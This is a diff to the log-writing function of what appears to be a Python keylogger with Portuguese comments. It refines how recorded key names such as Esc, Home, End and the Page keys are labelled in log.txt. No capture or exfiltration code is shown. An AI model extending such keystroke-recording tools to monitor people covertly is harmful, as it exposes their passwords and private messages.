@@ -25,9 +25,9 @@ def write_file(keys): #cria log.txt no diretorio desejado ( default = mesma pagi
             if k.find("backspace") > 0:  # Deixa o log mais bonito
                 f.write('"Apagou"')
                 
-            if k.find("up")> 0:
+            if k.find(".up")> 0:
                 f.write("'Cima'")
-            if k.find("down") > 0:
+            if k.find(".down") > 0:
                 f.write("'baixo'")
             if k.find("left")> 0:
                 f.write("'esquerda'")
@@ -54,6 +54,22 @@ def write_file(keys): #cria log.txt no diretorio desejado ( default = mesma pagi
                 f.write("'Delete'")
             if k.find("insert") > 0:
                 f.write("'Insert'")
+                
+            if k.find("esc") > 0:
+                f.write("'Esc'")
+
+            if k.find("pause") > 0:
+                f.write("'pause'")
+            if k.find("home") > 0:
+                f.write("'Home'")
+            if k.find("cmd") > 0:
+                f.write("'Windows'")
+            if k.find("end") > 0:
+                f.write("'End'")
+            if k.find("page_up") > 0:
+                f.write("'Page Up'")
+            if k.find("page_down") > 0:
+                f.write("'Page Down'")
 
 
 
